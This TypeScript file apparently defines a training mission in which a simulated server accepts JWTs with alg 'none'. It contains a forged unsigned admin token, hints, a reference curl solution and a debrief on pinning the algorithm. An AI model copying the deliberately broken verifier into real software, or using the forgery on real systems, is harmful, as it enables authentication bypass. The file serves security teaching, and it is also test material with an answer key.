/**
 * JWT forgery with alg:none, simulated. A JSON Web Token is three base64url
 * parts: a header saying how it's signed, a payload of claims, and a signature.
 * The toy server accepts a token whose header says `alg: none` and then trusts
 * the payload without checking any signature. So you write your own token. The
 * fix, in the debrief: pin the algorithm server-side and reject `none`.
 */
import { flagFrom, submitted, type Mission } from "../kit";
import { attackBox, ok, bad, notFound } from "./kit";
import type { Site } from "@/lib/shell/http";

/** Decode a base64url (or plain base64) segment, tolerant of missing padding. */
function decodeSeg(seg: string): unknown {
  const b64 = seg.replace(/-/g, "+").replace(/_/g, "/") + "===".slice((seg.length + 3) % 4);
  try {
    return JSON.parse(Buffer.from(b64, "base64").toString("utf8"));
  } catch {
    return null;
  }
}

const b64url = (obj: unknown) => Buffer.from(JSON.stringify(obj), "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

/** A forged, unsigned token claiming admin. Constant, so the reference solution is stable. */
const FORGED = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({ user: "admin", role: "admin" })}.`;

export const JWT: Mission[] = [
  {
    id: "break-jwt-1",
    title: "Sign nothing, be anyone",
    brief:
      "`id.lab/whoami` reads a JWT from the `token` cookie. Its header says `alg: HS256`, but the server accepts `alg: none` and then trusts the payload with no signature check. Forge a token that says you're the admin. A token is `base64url(header).base64url(payload).signature`.",
    greeting: "alg:none is a real, famous bug. If the server honours it, the signature is optional, so you just write the claims you want.",
    hints: [
      "Header: `{\"alg\":\"none\",\"typ\":\"JWT\"}`. Payload: `{\"user\":\"admin\",\"role\":\"admin\"}`. Signature: leave it empty.",
      "base64 each part (url-safe or plain both work here), join with dots, and end with a trailing dot for the empty signature.",
      `curl -s -b "token=${FORGED}" id.lab/whoami`,
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const site: Site = (r) => {
        if (r.path !== "/whoami") return notFound;
        const parts = (r.cookies.token ?? "").split(".");
        if (parts.length < 2) return bad(401, "No token.\n");
        const header = decodeSeg(parts[0] as string) as { alg?: string } | null;
        const payload = decodeSeg(parts[1] as string) as { role?: string; user?: string } | null;
        if (!header || !payload) return bad(401, "Malformed token.\n");
        // The bug: a token declaring alg:none is accepted without verifying any signature.
        if (header.alg !== "none" && (parts[2] ?? "") === "") return bad(401, "Signature required.\n");
        if (header.alg !== "none") return bad(401, "Signature check failed.\n");
        return payload.role === "admin" ? ok(`Signed in as admin. Flag: ${flag}\n`) : bad(403, `You are '${payload.role}'. Admins only.\n`);
      };
      return { shell: attackBox({ "id.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [`curl -s -b "token=${FORGED}" id.lab/whoami`, `submit ${w.flag}`],
    notEnough: () => [`curl -s id.lab/whoami`],
    debrief:
      "The server let the token choose its own algorithm, and `none` means 'no signature to check'. Pin the expected algorithm in the verifier, reject `none` outright, and verify with a key the client never sees. A token the client can rewrite is not authentication.",
  },
];
